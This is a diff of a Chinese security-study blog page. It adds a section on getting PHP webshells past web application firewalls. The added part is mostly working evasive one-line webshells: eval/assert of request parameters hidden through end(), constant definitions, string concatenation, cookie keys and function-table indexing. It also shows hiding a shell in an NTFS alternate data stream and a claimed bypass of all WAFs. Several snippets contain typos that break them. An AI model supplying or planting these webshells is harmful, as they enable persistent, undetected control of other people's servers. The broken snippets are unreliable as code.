@@ -635,14 +635,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        19.4k
+                        20k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        71 分
+                        74 分
                     </div>
                     
                 
@@ -1743,7 +1743,69 @@ $un -&gt; ();</code></pre><p><strong>反序列化一定要白盒代码审计的<
 <p>Apace里的H匹配是参数污染</p>
 <p>白名单（管理员权限或者是127.0.0.1本地访问不拦截）</p>
 <p>缓冲区（数据太多，超过了WAF检测的范围）【填充大量字符来溢出，例如填入大量注释内容，俺去昂狗大约二四千多个字符就能绕过】</p>
-<script>
+<h2 id="饶WAF（下）"><a href="#饶WAF（下）" class="headerlink" title="饶WAF（下）"></a>饶WAF（下）</h2><h3 id="WAF检测机制"><a href="#WAF检测机制" class="headerlink" title="WAF检测机制"></a>WAF检测机制</h3><p>这里我们开始讲Webshell小马的绕过。</p>
+<p>我们最常见的PHP一句话木马那就是</p>
+<pre><code>&lt;?php eval($_REQUEST['a']);?&gt;</code></pre><p>这个就是密码是a的一句话木马，这个语句肯定会被拦截的，那么有没有思考过是怎么拦截的呢？</p>
+<p>关于拦截其实最主要的还是测试，看看Waf究竟怎么拦截。[最直接的检测应该就是正则匹配]</p>
+<p>我们尝试只写&lt;?php eval();?&gt;发现没有拦截，但是加了$_REQUEST[‘a’]就拦截了，那么我们是不是可以尝试检测看看究竟拦截$_REQUEST[‘a’]的那个部分。</p>
+<p>然后测试发现，他拦截的是$_REQUEST[，那么我们只要不出现中括号就可以解决对吗？或者我们尝试把这个变量换一个就可以解决。</p>
+<p>例如：</p>
+<pre><code>&lt;?php eval(end($_REQUEST));?&gt;</code></pre><p>这个语句就没有出现$_REQUEST[，所以陈宫过狗，我们用end来代替了[]，但是它唯一不好的就是他没有密码，即传参名，所以用什么当密码都行。</p>
+<p>end函数的意义：输出数组中的当前元素和最后一个元素的值，然后因为我的传参就一个。</p>
+<h3 id="常见绕过手法"><a href="#常见绕过手法" class="headerlink" title="常见绕过手法"></a>常见绕过手法</h3><p>通过常量定义：</p>
+<pre><code>&lt;?php define("a","$_GET[1]");eval(a);?&gt;</code></pre><p>通过字符串你拼接+双美元符号：</p>
+<pre><code>&lt;?php
+    $a='ass';
+    $b='ert';
+    $funcName=$a.$b;
+    $x='funcName';
+    $$x($_REQUEST[1]);
+?&gt;</code></pre><p>通过函数定义强行分割：</p>
+<pre><code>&lt;?php
+    function a($a){
+    return $a
+    };
+    eval(a($_POST)['a']);    //强行分割$_POST['a']
+?&gt;</code></pre><p>通过类定义，然后传参强行分割</p>
+<pre><code>&lt;?php
+class User
+{
+  Public $name='';
+  function destruct(){
+    eval("$this-&gt;name");
+  }
+}
+$user=new User;
+$user-&gt;name=''.$_POST['dd'];
+?&gt;</code></pre><p>多方式传参免杀：</p>
+<pre><code>&lt;?php
+$COOKIE=$_COOKIE;
+foreach($COOKIE as $key=&gt;$value){
+    if($key=='assert'){
+        $key($POST['s'];)
+    }
+}
+?&gt;</code></pre><pre><code>&lt;?php
+$a=get_defined_funcitons();
+$a['internal'][841]($_GET['a']);
+?&gt;</code></pre><p>键值842代表assert，可以用var_dump查看</p>
+<br>
+
+<p>用前面的end再加上 if就能绕过D盾</p>
+<pre><code>&lt;?php
+    if($_SERVER['HTTP_USER_AGENT']==='1'){
+        eval(eend($_REQUEST));
+    }
+?&gt;</code></pre><br>
+
+<p>拿到shell之后藏shell的妙招：ntfs文件流</p>
+<pre><code>echo "&lt;?php eval($_REQUEST['a']?&gt;" &gt;&gt; /:123.txt</code></pre><p>此时会生成一个123.txt文件，但是不会显示</p>
+<p>再创建另个一个PHP文件，内容为</p>
+<pre><code>&lt;?php include('/:123.txt');?&gt;</code></pre><br>
+
+<p>绕过市面上所有的WAF（终极手法）</p>
+<pre><code>&lt;?php    eval(mysql_fetch_assoc(mysqli_query(mysqli_connect('127.0.0.1','root','root','maoshe'),'select * from info'))['info']);
+?&gt;</code></pre><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -2479,7 +2541,7 @@ $un -&gt; ();</code></pre><p><strong>反序列化一定要白盒代码审计的<
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">36.1k</span> 字
+                <span class="white-color">36.7k</span> 字
             
 
             
@@ -2695,5 +2757,5 @@ $(function () {
             </script>
         
 
-    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script><script>!function(e){var r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function t(){for(var c=0;c<r.length;c++)t=r[c],void 0,0<=(n=t.getBoundingClientRect()).top&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=r[c];t=o,n=function(){r=r.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}t(),e.addEventListener("scroll",function(){!function(t,n){clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)}(t,e)})}(this);</script></body>
+    <script>!function(e){var r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function t(){for(var c=0;c<r.length;c++)t=r[c],void 0,0<=(n=t.getBoundingClientRect()).top&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=r[c];t=o,n=function(){r=r.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}t(),e.addEventListener("scroll",function(){!function(t,n){clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)}(t,e)})}(this);</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script></body>
 </html>
